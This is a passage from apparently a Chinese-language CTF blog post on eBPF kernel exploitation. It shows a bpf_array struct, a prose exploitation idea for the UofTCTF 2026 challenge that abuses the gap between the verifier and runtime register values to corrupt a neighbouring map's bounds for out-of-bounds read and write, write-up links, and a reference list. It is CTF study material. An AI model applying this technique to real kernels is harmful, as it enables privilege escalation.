</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">bpf_array_aux</span> <span class="o">*</span><span class="n">aux</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">DECLARE_FLEX_ARRAY</span><span class="p">(</span><span class="kt">char</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="nf">__aligned</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">DECLARE_FLEX_ARRAY</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">)</span> <span class="nf">__aligned</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">DECLARE_FLEX_ARRAY</span><span class="p">(</span><span class="kt">void</span> <span class="n">__percpu</span> <span class="o">*</span><span class="p">,</span> <span class="n">pptrs</span><span class="p">)</span> <span class="nf">__aligned</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><h5 class="heading-element" id="利用思路"><span>利用思路</span>
  <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><p>由于三个<code>map</code>在内存上是连在一起的，每个<code>map</code>加上<code>0x400</code>就是下一个<code>map</code></p>
<p>利用<code>verifier</code>和运行时不一致的寄存器，越界读写下一个<code>map</code>（<code>victim map</code>）的<code>max_entries</code>和<code>index_mask</code>，都设置为<code>0xffffffff</code>，这样就能越界读写这个<code>map</code>接下来的很大一部分内存</p>
<blockquote>
<p>修改<code>index_map</code>是因为，某些路径中有：</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">index</span> <span class="o">&amp;=</span> <span class="n">array</span><span class="o">-&gt;</span><span class="n">index_mask</span><span class="p">;</span></span></span></code></pre></td></tr></table></div>
</div>
</div></blockquote>
<h4 class="heading-element" id="downunderctf-2025_rolling-around"><span>DownUnderCTF 2025_Rolling Around</span>
  <a href="#downunderctf-2025_rolling-around" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p><a href="https://9anux.org/2025/07/24/ebpf/" target="_blank" rel="external nofollow noopener noreferrer">https://9anux.org/2025/07/24/ebpf/</a></p>
<h4 class="heading-element" id="阿里云ctf-2025-beebee"><span>阿里云CTF 2025 beebee</span>
  <a href="#%e9%98%bf%e9%87%8c%e4%ba%91ctf-2025-beebee" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p><a href="https://blog.xmcve.com/2025/02/25/%E9%98%BF%E9%87%8C%E4%BA%91CTF2025-Writeup/#title-6" target="_blank" rel="external nofollow noopener noreferrer">https://blog.xmcve.com/2025/02/25/%E9%98%BF%E9%87%8C%E4%BA%91CTF2025-Writeup/#title-6</a></p>
<p><a href="https://bbs.kanxue.com/thread-285786-1.htm" target="_blank" rel="external nofollow noopener noreferrer">https://bbs.kanxue.com/thread-285786-1.htm</a></p>
<p><a href="https://xz.aliyun.com/news/17029?amp;u_atoken=27649aed9882a7bda204f993c159b1a6&amp;amp;u_asig=54d85" target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/news/17029?amp;u_atoken=27649aed9882a7bda204f993c159b1a6&amp;u_asig=54d85</a></p>
<h2 class="heading-element" id="ref"><span>ref</span>
  <a href="#ref" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://www.anquanke.com/post/id/263803" target="_blank" rel="external nofollow noopener noreferrer">BPF之路一bpf系统调用</a>，主要涉及<code>ebpf</code>的<code>JIT</code>部分</p>
<p><a href="https://niebelungen-d.github.io/seccon2021-kone-gadget/" target="_blank" rel="external nofollow noopener noreferrer">SECCON2021-kone_gadget WP</a></p>
<p><a href="https://bbs.kanxue.com/thread-267956-1.htm" target="_blank" rel="external nofollow noopener noreferrer">Linux内核eBPF虚拟机源码分析——verifier与jit </a></p>
<p><a href="https://9anux.org/2025/07/24/ebpf/" target="_blank" rel="external nofollow noopener noreferrer">Jailbreaking eBPF</a></p>
<p><a href="https://bbs.kanxue.com/thread-266200.htm" target="_blank" rel="external nofollow noopener noreferrer">Linux内核PWN [BPF模块整数溢出] 漏洞分析</a></p>
<p><a href="https://arttnba3.cn/tags/eBPF/" target="_blank" rel="external nofollow noopener noreferrer">a3 </a></p>
<p><a href="https://bbs.kanxue.com/thread-267956-1.htm" target="_blank" rel="external nofollow noopener noreferrer">Linux内核eBPF虚拟机源码分析——verifier与jit</a></p>
<p><a href="https://docs.ebpf.io/" target="_blank" rel="external nofollow noopener noreferrer">ebpf docs</a></p>
<p><a href="https://github.com/iovisor/bpf-docs/blob/master/eBPF.md" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/iovisor/bpf-docs/blob/master/eBPF.md</a></p>
<p><a href="https://stdnoerr.blog/blog/eBPF-exploitation-D3CTF-d3bpf" target="_blank" rel="external nofollow noopener noreferrer">https://stdnoerr.blog/blog/eBPF-exploitation-D3CTF-d3bpf</a></p>
<p><a href="https://196082.github.io/2023/01/06/d3bpf/" target="_blank" rel="external nofollow noopener noreferrer">https://196082.github.io/2023/01/06/d3bpf/</a></p></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Updated on 2026-02-02 12:18:53">Updated on 2026-02-02&nbsp;</span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/posts/kernel_ebpfpwn/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="vscode://file/D:%5cBlog%5ccontent%5cposts%5ckernel_ebpfpwn.md" title="Open in editor" target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"></section>
    <section><span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/phppwn_note/" class="post-nav-item" rel="prev" title="Phppwn笔记"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Phppwn笔记</a><a href="/posts/protobuf/" class="post-nav-item" rel="next" title="Protobuf笔记">Protobuf笔记<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
      <div class="toc">
        <h2 class="toc-title">Contents</h2>
        <div class="toc-content" id="toc-content-drawer"><nav >
  <ul>
    <li><a href="#基础知识">基础知识</a>
      <ul>
        <li><a href="#常用代码">常用代码</a></li>
        <li><a href="#什么是ebpf">什么是ebpf</a></li>
        <li><a href="#bpf程序架构">bpf程序架构</a>
          <ul>
            <li><a href="#寄存器">寄存器</a></li>
          </ul>
        </li>
        <li><a href="#verifier">verifier</a>
          <ul>
            <li><a href="#寄存器状态跟踪">寄存器状态跟踪</a></li>
            <li><a href="#一些规则">一些规则</a></li>
          </ul>
        </li>
        <li><a href="#alu-sanitation">ALU Sanitation</a></li>
        <li><a href="#源码">源码</a>
          <ul>
            <li><a href="#bpf_prog_load">bpf_prog_load</a></li>
            <li><a href="#bpf_check">bpf_check</a></li>
            <li><a href="#check_subprogs">check_subprogs</a></li>
          </ul>
        </li>
        <li><a href="#指令编写">指令编写</a>
          <ul>
            <li><a href="#alu类">ALU类</a></li>
            <li><a href="#赋值类">赋值类</a></li>
            <li><a href="#内存读写类">内存读写类</a></li>
            <li><a href="#跳转指令">跳转指令</a></li>
            <li><a href="#其他指令">其他指令</a></li>
          </ul>
        </li>
        <li><a href="#proc接口">proc接口</a></li>
        <li><a href="#调试">调试</a>
          <ul>
            <li><a href="#查结构体">查结构体</a></li>
            <li><a href="#实际执行bpf程序">实际执行bpf程序</a></li>
            <li><a href="#pwndbg">pwndbg</a></li>
          </ul>
        </li>
        <li><a href="#pwn思路">pwn思路</a></li>
        <li><a href="#模板">模板</a></li>
      </ul>
    </li>
    <li><a href="#例题">例题</a>
      <ul>
        <li>
          <ul>
            <li><a href="#sec-con-ctf-2021-kone_gadget">SEC CON CTF 2021 kone_gadget</a>
              <ul>
                <li><a href="#编写shellcode">编写shellcode</a></li>
              </ul>
            </li>
            <li><a href="#d3ctf-2022__d3bpf">D^3CTF 2022__d3bpf</a>
              <ul>
                <li><a href="#任意地址读写">任意地址读写</a></li>
                <li><a href="#思路流程">思路流程</a></li>
                <li><a href="#exp">exp</a></li>
              </ul>
            </li>
            <li><a href="#d3ctf-2022__d3bpf-v2">D^3CTF 2022__d3bpf-v2</a></li>
            <li><a href="#uoftctf-2026----extended-ebpf">UofTCTF 2026 - extended-eBPF</a>
              <ul>
                <li><a href="#源码-1">源码</a></li>
                <li><a href="#利用思路">利用思路</a></li>
              </ul>
            </li>
            <li><a href="#downunderctf-2025_rolling-around">DownUnderCTF 2025_Rolling Around</a></li>
            <li><a href="#阿里云ctf-2025-beebee">阿里云CTF 2025 beebee</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#ref">ref</a></li>
  </ul>
</nav></div>
      </div>
    </dialog></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.154.3"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.2-20260109063229-50d27e0e"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2026</span><span class="author" itemprop="copyrightHolder">
              <a href="/"> </a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><svg viewBox="0 0 100 100">
              <circle class="bg" cx="50" cy="50" r="50"></circle>
              <circle class="progress" cx="50" cy="50" r="50"></circle>
            </svg></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="Contents"><i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/js/config/f4d0eb536fabbd792151f6b3f19a7d2d.js" defer></script><script src="/js/theme.min.js" defer></script></body>
</html>
